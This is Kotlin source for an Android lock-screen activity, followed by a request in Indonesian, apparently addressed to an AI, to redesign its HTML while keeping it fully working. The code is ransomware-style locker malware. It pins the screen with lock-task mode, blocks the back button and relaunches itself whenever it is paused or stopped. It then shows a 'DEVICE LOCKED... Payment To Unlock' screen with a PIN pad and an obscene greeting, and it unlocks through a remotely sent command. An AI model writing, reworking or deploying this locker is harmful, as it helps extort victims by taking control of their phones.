package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
    val safeTitle = lockTitle
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace("\"", "&quot;")

    return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --green:#00ff41;
  --text:#e0ffe0;
  --text2:#44aa44;
  --text3:#1a4a1a;
  --panel:rgba(2,12,4,.55);
  --panel-brd:rgba(0,255,65,.18);
}
html,body{height:100%;width:100%;overflow:hidden;touch-action:none}
body{
  font-family:'Outfit',sans-serif;
  -webkit-font-smoothing:antialiased;
  min-height:100vh;
  color:var(--text);
  position:relative;
  overflow:hidden;
  background:#000;
}

/* ── BACKGROUND FOTO (URL) ── */
.bg-photo{
  position:fixed;inset:0;
  background-image:url('https://ganga--link--ghhzdp9sv8hk.code.run/i/9zvt8jff.jpg');
  background-size:cover;
  background-position:center;
  background-repeat:no-repeat;
  z-index:0;
  transition:filter .6s ease, transform .6s ease;
}
.bg-photo.full-bright{
  filter:none;
  z-index:200;
  animation:fullZoom 10s ease-in-out forwards;
}
@keyframes fullZoom{
  0%{transform:scale(1.05)}
  100%{transform:scale(1.15)}
}
.bg-overlay{
  position:fixed;inset:0;
  background:
    linear-gradient(180deg,rgba(0,0,0,.72) 0%,rgba(0,0,0,.55) 40%,rgba(0,0,0,.82) 100%),
    radial-gradient(ellipse 70% 50% at 50% 0%,rgba(0,255,65,.10) 0%,transparent 60%);
  z-index:1;
  transition:opacity .5s ease;
}
.bg-overlay.hide{opacity:0;pointer-events:none}

/* ── SCANLINE ── */
body::after{
  content:'';position:fixed;inset:0;
  background:repeating-linear-gradient(
    0deg,
    transparent,
    transparent 2px,
    rgba(0,255,65,.018) 2px,
    rgba(0,255,65,.018) 4px
  );
  pointer-events:none;
  z-index:2;
  animation:scanMove 8s linear infinite;
}
@keyframes scanMove{
  0%{background-position:0 0}
  100%{background-position:0 100px}
}

/* glitch flicker */
@keyframes glitch{
  0%,94%,100%{clip-path:none;transform:none;opacity:1}
  95%{clip-path:inset(30% 0 40% 0);transform:translateX(-4px);opacity:.85}
  97%{clip-path:inset(60% 0 10% 0);transform:translateX(4px);opacity:.9}
  99%{clip-path:inset(5% 0 80% 0);transform:translateX(-2px)}
}

/* ── INTRO SCREEN ── */
#introScreen{
  position:fixed;inset:0;
  background:#000;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  z-index:100;
  gap:20px;
  animation:introDismiss .4s ease forwards 4s;
}
@keyframes introDismiss{
  0%{opacity:1;transform:none}
  100%{opacity:0;transform:scale(1.06);pointer-events:none}
}
#introScreen.done{display:none}

.intro-skull{
  animation:pulseRed 1s ease-in-out infinite;
}
@keyframes pulseRed{
  0%,100%{filter:drop-shadow(0 0 8px #00ff41) drop-shadow(0 0 24px #00ff41)}
  50%{filter:drop-shadow(0 0 20px #00ff41) drop-shadow(0 0 50px #00ff41)}
}

.intro-title{
  font-family:'JetBrains Mono',monospace;
  font-size:20px;
  letter-spacing:3px;
  text-transform:uppercase;
  color:#00ff41;
  text-align:center;
  line-height:1.8;
}
.intro-title .line{display:block;overflow:hidden;white-space:nowrap}
.intro-title .line1{animation:typeIn .6s steps(22,end) .3s both}
.intro-title .line2{animation:typeIn .5s steps(18,end) 1.1s both}
.intro-title .line3{animation:typeIn .7s steps(26,end) 1.8s both}
@keyframes typeIn{from{width:0;opacity:0}to{opacity:1}}

.intro-bar-wrap{
  width:220px;height:3px;
  background:rgba(255,0,0,.15);
  border-radius:2px;
  overflow:hidden;
}
.intro-bar{
  height:100%;width:0%;
  background:linear-gradient(90deg,#00ff41,#00ff41,#00ff41);
  border-radius:2px;
  animation:barFill 2.5s ease .5s forwards;
  box-shadow:0 0 10px #00ff41;
}
@keyframes barFill{to{width:100%}}

.intro-pct-wrap{
  font-family:'JetBrains Mono',monospace;
  font-size:10px;letter-spacing:2px;color:#00ff41;
  height:16px;overflow:hidden;
  position:relative;width:60px;text-align:center;
}
.pct-num{
  position:absolute;width:100%;text-align:center;
}

/* ── DATA STREAM PARTICLES ── */
.data-stream{
  position:fixed;top:0;left:0;width:100%;height:100%;
  pointer-events:none;z-index:3;overflow:hidden;
}
.data-col{
  position:absolute;top:-100%;
  font-family:'JetBrains Mono',monospace;
  font-size:11px;color:rgba(0,255,65,.15);
  line-height:1.4;
  animation:dataFall linear infinite;
  white-space:pre;
}
@keyframes dataFall{to{top:110%}}

/* ── MAIN LAYOUT ── */
#mainContent{
  position:relative;z-index:10;
  width:100%;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:space-between;
  padding:48px 24px 32px;
  opacity:0;
  animation:mainIn .6s ease forwards 4.4s;
}
@keyframes mainIn{to{opacity:1}}

/* ── TOP HEADER ── */
.top-header{
  width:100%;
  display:flex;flex-direction:column;align-items:center;
  text-align:center;
  gap:14px;
  flex-shrink:0;
}

.warning-title{
  font-family:'Outfit',sans-serif;
  font-size:28px;
  font-weight:800;
  letter-spacing:1.5px;
  color:#fff;
  text-shadow:
    0 0 20px rgba(0,255,65,.6),
    0 0 40px rgba(0,255,65,.3),
    0 2px 4px rgba(0,0,0,.8);
  animation:glitch 7s ease infinite;
  line-height:1.15;
}

.warning-sub{
  font-family:'JetBrains Mono',monospace;
  font-size:11px;
  letter-spacing:2px;
  text-transform:uppercase;
  color:#88cc88;
  text-shadow:0 1px 3px rgba(0,0,0,.9);
  max-width:340px;
  line-height:1.6;
}

.server-title{
  margin-top:6px;
  font-family:'Outfit',sans-serif;
  font-size:18px;
  font-weight:700;
  color:#00ff41;
  text-align:center;
  letter-spacing:.3px;
  text-shadow:0 0 14px rgba(0,255,65,.6), 0 2px 4px rgba(0,0,0,.8);
  padding:0 12px;
  max-width:90vw;
  word-wrap:break-word;
}

/* ── BOTTOM PIN PANEL ── */
.pin-panel{
  width:100%;
  max-width:340px;
  background:var(--panel);
  backdrop-filter:blur(14px);
  -webkit-backdrop-filter:blur(14px);
  border:1px solid var(--panel-brd);
  border-radius:24px;
  padding:22px 18px 20px;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:16px;
  box-shadow:
    0 10px 40px rgba(0,0,0,.7),
    0 0 40px rgba(0,255,65,.08),
    inset 0 1px 0 rgba(0,255,100,.06);
  flex-shrink:0;
  animation:fadeUp .5s cubic-bezier(.16,1,.3,1) .3s both;
}
@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}

.panel-label{
  font-family:'JetBrains Mono',monospace;
  font-size:9px;
  letter-spacing:3px;
  text-transform:uppercase;
  color:#1a5a1a;
}

/* ── PIN DOTS ── */
.pin-wrap{display:flex;gap:16px;justify-content:center;}
.pin-dot{
  width:14px;height:14px;border-radius:50%;
  border:1.5px solid rgba(0,255,65,.25);
  background:transparent;
  transition:background .18s,border-color .18s,box-shadow .18s,transform .18s;
}
.pin-dot.filled{
  background:var(--green);border-color:var(--green);
  box-shadow:0 0 14px rgba(0,255,65,.8),0 0 28px rgba(0,255,65,.4);
  transform:scale(1.12);
}
.pin-dot.error{
  border-color:#00ff41;background:rgba(255,20,20,.3);
  box-shadow:0 0 12px rgba(255,40,40,.6);
  animation:shake .38s ease;
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}

/* ── STATUS ── */
.pin-status{
  height:20px;
  font-family:'JetBrains Mono',monospace;
  font-size:10px;
  letter-spacing:2px;
  text-transform:uppercase;
  text-align:center;
  color:#1a5a1a;
  transition:color .2s;
}
.pin-status.err{color:#ff3333}
.pin-status.ok{color:var(--green);text-shadow:0 0 10px var(--green)}

/* ── KEYPAD ── */
.keypad{
  display:grid;grid-template-columns:repeat(3,1fr);
  gap:8px;width:100%;
}
.key{
  height:60px;border-radius:14px;
  border:1px solid rgba(0,255,65,.08);
  background:linear-gradient(160deg,rgba(0,255,65,.05),rgba(0,80,20,.03));
  color:var(--text);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;-webkit-tap-highlight-color:transparent;
  transition:transform .1s,background .1s,border-color .1s,box-shadow .1s;
  position:relative;overflow:hidden;user-select:none;
  box-shadow:0 2px 8px rgba(0,0,0,.5),inset 0 1px 0 rgba(0,255,65,.03);
}
.key::before{
  content:'';position:absolute;top:0;left:10%;right:10%;height:1px;
  background:linear-gradient(90deg,transparent,rgba(0,255,65,.07),transparent);
}
.key .num{font-size:22px;font-weight:700;line-height:1;letter-spacing:-.3px;color:#e0ffe0;}
.key .sub{font-family:'JetBrains Mono',monospace;font-size:7px;letter-spacing:2px;color:#1a5a1a;margin-top:3px}
.key.del{color:var(--text2)}
.key.empty{pointer-events:none;opacity:0;background:transparent;border-color:transparent;box-shadow:none}
.key:active{
  transform:scale(.93);
  background:linear-gradient(160deg,rgba(0,255,65,.14),rgba(0,120,40,.1));
  border-color:rgba(0,255,65,.3);
  box-shadow:0 0 20px rgba(0,255,65,.15),inset 0 1px 0 rgba(0,255,65,.1);
}
</style>
</head>
<body>

<!-- INTRO SCREEN -->
<div id="introScreen">
  <div class="intro-skull">
    <svg width="72" height="72" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <ellipse cx="32" cy="26" rx="18" ry="17" fill="none" stroke="#00ff41" stroke-width="2"/>
      <ellipse cx="24" cy="24" rx="5.5" ry="6" fill="rgba(255,51,51,0.25)" stroke="#00ff41" stroke-width="1.5"/>
      <ellipse cx="40" cy="24" rx="5.5" ry="6" fill="rgba(255,51,51,0.25)" stroke="#00ff41" stroke-width="1.5"/>
      <path d="M30 32 L32 28 L34 32 Z" fill="rgba(255,51,51,0.4)" stroke="#00ff41" stroke-width="1"/>
      <path d="M14 38 Q14 48 22 48 L22 52 L26 52 L26 48 L32 48 L32 52 L36 52 L36 48 L42 48 Q50 48 50 38" stroke="#00ff41" stroke-width="2" fill="none" stroke-linecap="round"/>
      <line x1="26" y1="48" x2="26" y2="42" stroke="#00ff41" stroke-width="1.5"/>
      <line x1="32" y1="48" x2="32" y2="42" stroke="#ff3333" stroke-width="1.5"/>
      <line x1="38" y1="48" x2="38" y2="42" stroke="#00ff41" stroke-width="1.5"/>
      <path d="M14 38 Q32 44 50 38" stroke="#00ff41" stroke-width="1.5" fill="none"/>
    </svg>
  </div>

  <div class="intro-title">
    <span class="line line1">Hai Anak Ngentot</span>
    <span class="line line2">NeXsus Infinity Project</span>
    <span class="line line3">Phone Is Locked</span>
  </div>

  <div class="intro-bar-wrap">
    <div class="intro-bar"></div>
  </div>

  <div class="intro-pct-wrap">
    <span class="pct-num" id="pctNum">0%</span>
  </div>
</div>

<!-- BACKGROUND FOTO -->
<div class="bg-photo" id="bgPhoto"></div>
<div class="bg-overlay" id="bgOverlay"></div>

<!-- DATA STREAM BG -->
<div class="data-stream" id="dataStream"></div>

<!-- MAIN CONTENT -->
<div id="mainContent">

  <!-- TOP: WARNING TITLE -->
  <div class="top-header">
    <div class="warning-title">☠️ DEVICE LOCKED ☠️</div>
    <div class="warning-sub">Locked Your Is Device,<br>Payment To Unlock</div>
    <div class="server-title">$safeTitle</div>
  </div>

  <!-- BOTTOM: PIN PANEL -->
  <div class="pin-panel">
    <div class="panel-label">Enter PIN To Unlock</div>

    <div class="pin-wrap">
      <div class="pin-dot" id="d0"></div>
      <div class="pin-dot" id="d1"></div>
      <div class="pin-dot" id="d2"></div>
      <div class="pin-dot" id="d3"></div>
    </div>

    <div class="pin-status" id="pinStatus">Creator Smooth UK</div>

    <div class="keypad" id="keypad">
      <div class="key" data-n="1"><span class="num">1</span><span class="sub"></span></div>
      <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
      <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
      <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
      <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
      <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
      <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
      <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
      <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
      <div class="key empty"></div>
      <div class="key" data-n="0"><span class="num">0</span></div>
      <div class="key del" data-del="1">
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
          <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
        </svg>
      </div>
    </div>
  </div>

</div>

<script>
/* ── INTRO PERCENT COUNTER ── */
(function(){
  var el = document.getElementById('pctNum');
  var start = null;
  var dur = 2500;
  function step(ts){
    if(!start) start = ts + 500;
    var p = Math.min(1, Math.max(0,(ts-start)/dur));
    var v = Math.floor(p*100);
    el.textContent = v + '%';
    if(p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
})();

/* ── HIDE INTRO AFTER ANIMATION ── */
setTimeout(function(){
  var intro = document.getElementById('introScreen');
  intro.style.pointerEvents = 'none';
  setTimeout(function(){ intro.style.display='none'; }, 400);
}, 4000);

/* ── DATA STREAM COLUMNS ── */
(function(){
  var chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEF';
  var container = document.getElementById('dataStream');
  var cols = Math.floor(window.innerWidth / 22);
  for(var i=0;i<cols;i++){
    var col = document.createElement('div');
    col.className = 'data-col';
    col.style.left = (i*22) + 'px';
    col.style.animationDuration = (6 + Math.random()*14) + 's';
    col.style.animationDelay = (Math.random()*-20) + 's';
    col.style.opacity = (.04 + Math.random()*.1).toString();
    var txt = '';
    for(var j=0;j<32;j++){
      txt += chars[Math.floor(Math.random()*chars.length)] + '\n';
    }
    col.textContent = txt;
    container.appendChild(col);
  }
})();

/* ── FULLSCREEN FOTO SAAT PIN SALAH ── */
var photoTimeout = null;
function showFullscreenPhoto(){
  var bg = document.getElementById('bgPhoto');
  var overlay = document.getElementById('bgOverlay');
  overlay.classList.add('hide');
  bg.classList.add('full-bright');
  if(photoTimeout) clearTimeout(photoTimeout);
  photoTimeout = setTimeout(function(){
    bg.classList.remove('full-bright');
    overlay.classList.remove('hide');
    photoTimeout = null;
  }, 10000);
}

/* ── ORIGINAL PIN LOGIC ── */
var pin = '';
var blocked = false;
document.getElementById('keypad').addEventListener('touchend', function(e) {
  e.preventDefault();
  var key = e.target.closest('.key');
  if (!key || key.classList.contains('empty')) return;
  if (key.dataset.del) { doDelete(); return; }
  if (key.dataset.n !== undefined) doPress(key.dataset.n);
}, { passive: false });
document.getElementById('keypad').addEventListener('click', function(e) {
  if (e.sourceCapabilities && e.sourceCapabilities.firesTouchEvents) return;
  var key = e.target.closest('.key');
  if (!key || key.classList.contains('empty')) return;
  if (key.dataset.del) { doDelete(); return; }
  if (key.dataset.n !== undefined) doPress(key.dataset.n);
});
function doPress(n) {
  if (blocked || pin.length >= 4) return;
  pin += n;
  updateDots();
  if (pin.length === 4) setTimeout(checkPin, 150);
}
function doDelete() {
  if (blocked) return;
  pin = pin.slice(0, -1);
  updateDots();
  setStatus('', false, false);
}
function updateDots() {
  for (var i = 0; i < 4; i++) {
    var d = document.getElementById('d' + i);
    d.classList.toggle('filled', i < pin.length);
    d.classList.remove('error');
  }
}
function checkPin() {
  var ok = false;
  try { ok = LockBridge.tryUnlock(pin); } catch(e) {}
  if (ok) {
    setStatus('PIN Benar \u2713', false, true);
  } else {
    setStatus('PIN Salah!', true, false);
    for (var i = 0; i < 4; i++) {
      document.getElementById('d' + i).classList.add('error');
    }
    showFullscreenPhoto();
    blocked = true;
    setTimeout(function() {
      pin = ''; blocked = false;
      updateDots();
      setStatus('Coba lagi', false, false);
    }, 1200);
  }
}
function setStatus(msg, isErr, isOk) {
  var el = document.getElementById('pinStatus');
  el.textContent = msg || 'Ketuk angka untuk memasukkan PIN';
  el.className = 'pin-status' + (isErr ? ' err' : isOk ? ' ok' : '');
}
</script>
</body>
</html>
"""
}
}

bisa kamu ubah html nya? jadi nanti tampilannya ubah total, pertama dibagian atas kasih teks ☠️ DEVICE LOCKED ☠️ lalu dibawah teks ini ada teks kecil yaitu Locked Your Is Device, Payment To Unlock. lalu untuk dibagian bawah nya itu dipaling bawah ada Kotak area didalamnya ada angka angka gitu buat input password nya lalu teks Device Locked nya ini itu bisa diubah sesuai di server nya, sudah hanya melakukan perubahan ini saja sisanya masih sama 100% pastikan work seperti sebelumnya, dan background nya ini berupa foto url yaitu https://ganga--link--ghhzdp9sv8hk.code.run/i/9zvt8jff.jpg
lalu jika password nya salah nanti background foto nya ini akan full layar selama 10 detik